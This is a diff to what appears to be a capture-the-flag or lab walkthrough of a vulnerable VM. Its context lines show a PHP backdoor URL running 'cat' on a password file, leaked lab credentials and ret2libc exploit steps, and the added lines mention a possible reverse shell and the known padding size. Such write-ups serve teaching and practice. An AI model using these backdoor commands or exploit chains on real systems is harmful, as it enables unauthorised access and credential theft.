@@ -171,6 +171,8 @@ https://192.168.94.8/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/pas
 lmezard:G!@M6f4Eatau{sF"
 ```
 
+*Additionally you could also start a reverse shell here, but I didn't bother with it.*
+
 Finally we have new credentials! They don't work for ssh, but they do for ftp.
 
 # Ftp
@@ -926,6 +928,7 @@ padding + address of system + any address + address of "/bin/sh"
 // Although I wrote any address, if you want the program to terminate properly, you need to put the address of exit.
 ```
 
+We already know the size of the padding (*see ret2shellcode*), so we just need to find the address of system and the address of "/bin/sh".
 Let's find the address of system with `gdb`:
 ```
 (gdb) p system
